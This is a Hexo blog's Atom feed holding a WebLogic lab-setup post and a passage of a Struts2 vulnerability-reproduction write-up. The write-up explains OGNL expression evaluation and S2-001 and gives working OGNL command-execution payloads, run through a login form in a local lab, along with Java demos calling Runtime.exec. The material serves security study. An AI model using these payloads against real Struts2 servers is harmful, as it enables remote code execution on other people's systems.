<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>reader-l&#39;s blog</title>
  
  <subtitle>虽然很慢，但仍在前进</subtitle>
  <link href="https://reader-l.github.io/atom.xml" rel="self"/>
  
  <link href="https://reader-l.github.io/"/>
  <updated>2021-07-04T09:06:12.889Z</updated>
  <id>https://reader-l.github.io/</id>
  
  <author>
    <name>reader-l</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Weblogic漏洞学习</title>
    <link href="https://reader-l.github.io/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://reader-l.github.io/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-07-04T07:14:24.000Z</published>
    <updated>2021-07-04T09:06:12.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    <code>Weblogic </code>也算是使用范围非常广的中间件了，因此也是安全研究人员注重的一块蛋糕，因此我也需要学习提高一下。在 Weblogic 的反序列化漏洞中主要是 <code>XMLDecoder</code> 和 <code>T3 </code>，所以就先来学习一下<code>T3</code>反序列化。</p><h1 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h1><p>​    由于<code>weblogic</code>环境搭建过程非常繁琐，因此我是用奇安信<code>A-Team</code>师傅们提供的一个环境搭建脚本：</p><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p> 下载下来后，需要在脚本路径下创建两个文件夹<code>jdks</code>和<code>weblogics</code>.</p><p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.png"></p><p>然后下载对应版本的<code>JDK</code>和<code>Weblogic</code>然后分别放在<code>jdks</code> 和 <code>weblogics </code>中</p><p><code>JDK</code>安装包下载地址：<a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></p><p><code>Weblogic</code>安装包下载地址：<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></p><p>我这里下载的是<code>weblogic 10.3.6</code>以及<code>jdk7u21</code></p><p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/2.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .<br><br>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21<br></code></pre></td></tr></table></figure><p>这样我们的<code>weblogic</code>就运行起来了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    &lt;code&gt;Weblogic &lt;/code&gt;也算是使用范围非常广的中间件了，因此也是安全研究人员注重的一块蛋糕，因</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Weblogic" scheme="https://reader-l.github.io/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Struts2漏洞复现合集</title>
    <link href="https://reader-l.github.io/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
    <id>https://reader-l.github.io/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</id>
    <published>2021-06-29T01:09:27.000Z</published>
    <updated>2021-07-04T06:58:41.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    最近在学习JAVA安全，所以部分JAVA的相关框架漏洞自然就是我学习的重中之重，近几年Struts2各种RCE的漏洞频出。因此我也得抓住时机好好学习。我会陆陆续续将所有struts2 RCE漏洞都复现分析一遍。</p><p>​    <code>OGNL</code>（<code>Object-Graph Navigation Language</code>，对象图导航语言），可以通过简单的表达式来访问Java对象中的属性。它是<code>Struts2</code>框架的默认表达式语言。假设在Action中有一个属性类型是对象Student(name, age)，变量名是<code>stu</code>，那么访问属性name的<code>OGNL</code>表达式为<code>stu.name</code>。</p><h2 id="漏洞原理简介"><a href="#漏洞原理简介" class="headerlink" title="漏洞原理简介"></a>漏洞原理简介</h2><p>ognl表达式的getValue函数本身具有执行java代码的能力，最基础的形式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo;<br><br><span class="hljs-keyword">import</span> ognl.Ognl;<br><span class="hljs-keyword">import</span> ognl.OgnlContext;<br><span class="hljs-keyword">import</span> ognl.OgnlException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ognlExp</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> OgnlException </span>&#123;<br>            OgnlContext context = <span class="hljs-keyword">new</span> OgnlContext();<br>            Object obj = Ognl.getValue(<span class="hljs-string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,context);<br>            System.out.println(obj);<br>            Object obj1 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.String@format(&#x27;foo %s&#x27;,&#x27;bar&#x27;)&quot;</span>,context);<br>            System.out.println(obj1);<br>            Object obj2 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>,context);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器，这样我们可以知道只要<code>Ognl.getValue</code>的第一个参数是用户可以控制的，那就可以用来执行任意Java代码进而触发RCE。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/0.png"></p><p>同时<code>Ognl.setValue()</code>也是具有执行JAVA代码的能力的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo;<br><br><span class="hljs-keyword">import</span> ognl.Ognl;<br><span class="hljs-keyword">import</span> ognl.OgnlContext;<br><span class="hljs-keyword">import</span> ognl.OgnlException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ognlExp</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> OgnlException </span>&#123;<br>            OgnlContext context = <span class="hljs-keyword">new</span> OgnlContext();<br>            Object obj = Ognl.getValue(<span class="hljs-string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,context);<br>            System.out.println(obj);<br>            Object obj1 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.String@format(&#x27;foo %s&#x27;,&#x27;bar&#x27;)&quot;</span>,context);<br>            System.out.println(obj1);<br><span class="hljs-comment">//            Object obj2 = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;,context);</span><br>            Ognl.setValue(<span class="hljs-string">&quot;(@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;))(reader-l)(amadeus)&quot;</span>,context,<span class="hljs-string">&quot;&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器。</p><blockquote><p>​    看一下这个ognl的表达式，表面上去看上去是有点诡异的，在我们上面的getValue的exp后面多了个(reader-l)(amadeus)，关于ognl对上面这串表达式的执行流程是，ognl首先对(&quot;@java.lang.Runtime@getRuntime().exec(&#39;open /Applications/Calculator.app/&#39;)&quot;)(glassy)当做表达式进行计算，这个表达式返回了带有payload的ASTEval树，然后以amadeus为root再对这个AST树进行计算，从而造成了RCE.</p></blockquote><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/-1.png"></p><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h1><h2 id="1-Struts2-001"><a href="#1-Struts2-001" class="headerlink" title="1.Struts2-001"></a>1.Struts2-001</h2><h3 id="1-漏洞概要："><a href="#1-漏洞概要：" class="headerlink" title="1.漏洞概要："></a>1.漏洞概要：</h3><p>Struts2-001是一个远程代码执行漏洞</p><p>漏洞影响版本： <code>Struts 2.0.0 - Struts 2.0.8</code> 。更多详情可参考官方通告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><h3 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>Tomcat 8.5.64 + Struts2.0.8</p><p>审计环境：IDEA2021</p><p>利用IDEA自带的创建struts2的模块来进行搭建</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/1.png"></p><p>创建完毕后，就要把struts2的库加载到项目中（记得去掉一些不必要的库，否则会导致项目运行失败！！）</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/2.png"></p><p>其中漏洞复现中必要的文件如下：</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/`<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-default.xml&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;default&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>index.jsp（前端恶意代码入口）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: reader-l<br>  Date: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">30</span><br>  Time: 上午<span class="hljs-number">8</span>:<span class="hljs-number">52</span><br>  To change <span class="hljs-keyword">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;用户登录&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;用户登录&lt;/h1&gt;<br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>以及action类 （LoginAction）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> bean.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> User user;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getUser</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUser</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.user = user;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String username = <span class="hljs-keyword">this</span>.username;<br>        String password = <span class="hljs-keyword">this</span>.password;<br>        System.out.println(<span class="hljs-string">&quot;用户名:&quot;</span>+username+<span class="hljs-string">&quot;密码:&quot;</span>+password);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>JavaBean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> bean;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String username, String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>项目结构如下：</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/3.png"></p><h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>在index.jsp的输入框中填写该poc：<code>%&#123;1+1&#125;</code></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/4.png"></p><p>成功得到计算结果：</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/5.png"></p><p>命令执行EXP:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">%&#123;#a=(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String[]&#123;<span class="hljs-string">&quot;ifconfig&quot;</span>&#125;)</span>).redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>.start<span class="hljs-literal">()</span>,#b=#a.get<span class="hljs-constructor">InputStream()</span>,#c=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">InputStreamReader(#<span class="hljs-params">b</span>)</span>,#d=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">BufferedReader(#<span class="hljs-params">c</span>)</span>,#e=<span class="hljs-keyword">new</span> <span class="hljs-built_in">char</span><span class="hljs-literal">[<span class="hljs-number">50000</span>]</span>,#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.get<span class="hljs-constructor">Writer()</span>.println(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">String(#<span class="hljs-params">e</span>)</span>),#f.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>,#f.get<span class="hljs-constructor">Writer()</span>.close<span class="hljs-literal">()</span>&#125;<br></code></pre></td></tr></table></figure><p>成功执行得到当前用户名</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/6.png"></p><figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs purebasic">%&#123;<span class="hljs-symbol">#a</span>=@java.lang.<span class="hljs-keyword">Runtime</span>@getRuntime(),<span class="hljs-symbol">#b</span>=<span class="hljs-symbol">#a</span>.exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>执行系统命令弹出计算器</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/7.png"></p><h3 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>​    我们先来理解一下用户请求在Struts框架中的流程是怎么样的：</p><p>通过下图我们可以知道在执行Action动作方法之前，程序会先执行一些拦截器。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/8.png"></p><p>其中<code>ParametersInterceptor</code>拦截器会把<code>ActionContext</code>中的请求参数设置到<code>ValueStack</code>中。</p><p>什么是<code>ValueStack</code>？</p><p><code>ValueStack</code>实际是一个接口,在<code>Struts2</code>中利用<code>OGNL</code>时，实际上使用的是实现了该接口的<code>OgnlValueStack</code>类,这个类是<code>Struts2</code>利用<code>OGNL</code>的基础。</p><p><code>ValueStack</code>(值栈): 贯穿整个 Action 的生命周期(每个 Action 类的对象实例都拥有一个<code>ValueStack</code>对象)，相当于一个数据的中转站. 在其中保存当前Action 对象和其他相关对象。</p><blockquote><p>在 ValueStack 对象的内部有两个逻辑部分:<br>– ObjectStack: Struts 把action和相关对象压入 ObjectStack 中–List。<br>– ContextMap: Struts 把各种各样的映射关系(一些 Map 类型的对象) 压入ContextMap 中。<br>Struts 会把下面这些映射压入 ContextMap 中<br>– parameters: 该 Map 中包含当前请求的请求参数<br>– request: 该 Map 中包含当前 request 对象中的所有属性<br>– session: 该 Map 中包含当前 session 对象中的所有属性<br>– application:该 Map 中包含当前 application 对象中的所有属性<br>– attr: 该 Map 按如下顺序来检索某个属性: request, session, application</p></blockquote><p>在<code>ParameterFilterInterceptor</code>拦截器上下个断点来看看是如何把请求参数压在<code>ValueStack</code>中。</p><p><code>com.opensymphony.xwork2.interceptor.ParameterFilterInterceptor</code></p><p>可以发现拦截器获取到了我们访问的action对象（还未赋值）、以及<code>ValueStack</code>值栈。其中<code>parameters</code>（Map对象）获取到了<code>ActionContext</code>（Struts2的数据中心）的值（也就是请求参数值）。然后拦截器就将这三个对象放入<code>setParameters</code>中处理</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/10.png"></p><p>跟进<code>setParameters</code>方法查看，可以发现该方法的作用就是将用户的请求参数键值以此存放<code>ValueStack</code>对象之中。</p><p><img 